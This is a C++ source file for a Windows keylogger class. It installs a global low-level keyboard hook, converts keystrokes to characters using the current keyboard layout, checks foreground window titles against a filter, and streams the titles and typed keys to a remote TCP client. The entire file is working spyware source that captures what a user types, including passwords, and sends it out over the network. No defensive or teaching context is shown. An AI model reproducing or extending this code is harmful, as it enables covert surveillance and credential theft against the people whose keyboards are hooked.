#pragma once
#include "Keylogger.h"

const std::vector<int> Keylogger::valueKeys = {
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, //numbers from 0 to 9
	VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, // Numpad numbers from 0 to 9
	0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, // Alphabet from a to z
	VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_8,  VK_SPACE // Keyboard specific keys
};
const std::vector<int> Keylogger::specialKeys = {VK_LBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_SHIFT, VK_LCONTROL, VK_RCONTROL, 
												 VK_MENU, VK_ESCAPE, VK_DELETE, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN }; //Special Keys
const std::vector<int> Keylogger::numpadKeys = { VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE }; //Numpad special keys
const std::vector<std::vector<int>> Keylogger::trackedKeys = { specialKeys, valueKeys, numpadKeys };

const std::vector<std::wstring> Keylogger::specialKeysNames = { L"{LMB}", L"{BSPC}", L"{TAB}",L"{ENTER}",L"{SHIFT}",L"{LCTRL}",
																L"{RCTRL}",L"{ALT}",L"{ESC}",L"{DEL}",L"{LA}",L"{UA}",
																L"{RA}",L"{DA}" };

Filter* Keylogger::filter;
TcpClient* Keylogger::client;

BYTE Keylogger::states[256] = {0};

HWND Keylogger::hLastTrackedWindow = NULL;
bool Keylogger::isWorthy = false;
std::wstring Keylogger::lastTrackedWindowTitle;

Keylogger::Keylogger(TcpClient* client, Filter* filter) {
	this->filter = filter;
	this->client = client;
}

Keylogger::~Keylogger() {
	delete this->filter;
	this->client->Flush();
	this->client->Disconnect();
}

HHOOK hKeyboardHook;

__declspec(dllexport) LRESULT CALLBACK Keylogger::KeyboardEventHandler(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))) {
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		int key = hooked_key.vkCode;

		if (key == VK_RSHIFT || key == VK_LSHIFT)
			states[VK_SHIFT] = 0x00;
	}

	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		int key = hooked_key.vkCode;

		if (key == VK_RSHIFT || key == VK_LSHIFT)
			states[VK_SHIFT] = 0xff;
		if (key == VK_CAPITAL)
			states[VK_CAPITAL] ^= 0xff;


		bool isTrackedKey = false;
		int keyGroup = 0;
		int keyPos = 0;
		for (unsigned int i = 0; i < trackedKeys.size(); i++) {
			for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
				if (key == trackedKeys[i][j]) {
					isTrackedKey = true;
					keyGroup = i;
					keyPos = j;
					break;
				}			
			}
		}
		if (isTrackedKey) {
			HWND hWindow = GetForegroundWindow();
			HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));

			wchar_t windowTitleBuf[255];
			GetWindowTextW(hWindow, windowTitleBuf, 255);
			std::wstring title(windowTitleBuf);
			if (title != lastTrackedWindowTitle) {
				if (filter->Check(title)) {
					isWorthy = true;
					hLastTrackedWindow = hWindow;
					lastTrackedWindowTitle = title;
					std::wstring message = L"\n[" + title + L"]\n\t";
					client->Send(message);
				}
				else
					isWorthy = false;
			}
			else if (title != L"")
				isWorthy = true;

			switch (keyGroup) //key group
			{
			case 0:

				if (isWorthy)
					client->Send(specialKeysNames[keyPos]);
				break;
			case 1: //valueKeys
			case 2:
				wchar_t wcharBuf[2];
				
				ToUnicodeEx(trackedKeys[keyGroup][keyPos], 0, states, wcharBuf, 2, 0, lang);

				if (isWorthy)
					client->Send(wcharBuf[0]);
				break;
			}
		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}


void Keylogger::LogKeys()
{
	states[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
	HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEventHandler, NULL, NULL);
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	UnhookWindowsHookEx(hKeyboardHook);
}